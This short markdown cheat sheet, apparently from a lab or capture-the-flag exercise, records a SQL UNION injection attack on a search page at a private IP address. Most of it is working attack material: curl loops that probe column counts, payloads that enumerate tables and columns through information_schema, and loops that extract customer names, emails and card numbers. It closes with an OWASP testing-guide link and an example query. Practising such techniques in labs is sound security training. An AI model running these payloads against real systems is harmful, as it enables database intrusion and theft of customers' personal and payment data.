# sql union injection

```bash

curl -s "http://10.XXX.XX.XXX/search.php?name=Ruby%27+ORDER+BY+1+%23++&submit=Search"

for i in $(seq 0 10);
do
    echo -n "${i} : " ; curl -s "http://10.XXX.XX.XXX/search.php?name=Ruby%27+ORDER+BY+${i}+%23++&submit=Search"
done


' ORDER BY 1 #
' ORDER BY 2 #
' ORDER BY 3 #
' ORDER BY 4 #
' ORDER BY 5 #

' UNION SELECT 1,2,3,4 #

' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#

     1 2 Private,customers
          
 ' UNION SELECT 1,group_concat(column_name, 0x0a),3 FROM information_schema.columns WHERE table_name="customers"#
 
     1 ID ,Firstname ,Lastname ,Email ,PhoneNumber ,CardNum ,ExpDate 3
      

' UNION SELECT 1,group_concat(column_name, 0x0a),3 FROM information_schema.columns WHERE table_name="Private"#

     1 id ,company ,contact ,currency ,balanceowed ,location ,username 3


' UNION SELECT 1,'text2',3 FROM information_schema.columns WHERE table_name="Private"# 

for i in $(seq 0 100);
do
    echo -n "ID ${i} : " ; curl "http://10.102.1.228/search.php?name=%27+UNION+ALL+SELECT+Firstname%2C+Lastname%2C+CardNum+FROM+customers+WHERE+ID%3D%22${i}%22%23"
done

' UNION ALL SELECT currency,'text2','text3' FROM Private WHERE ID="1"# 

' UNION ALL SELECT Firstname, Lastname, CardNum FROM customers WHERE ID="1"# 

' UNION ALL SELECT Firstname, Lastname, Email FROM customers WHERE Firstname="Martin"# 

' UNION ALL SELECT ID, Lastname, Email FROM customers WHERE Firstname="Martin"# 


' UNION ALL SELECT company, balanceowed, username FROM Private WHERE id=""# 

```

sql UNION exploitation technique explained by `owasp.org`

<https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection>

original query - `SELECT Name, Phone, Address FROM Users WHERE Id=$id`

query w/ union - `SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

`' UNION ALL SELECT Firstname,'text2','text3' FROM customers WHERE ID="1"#`
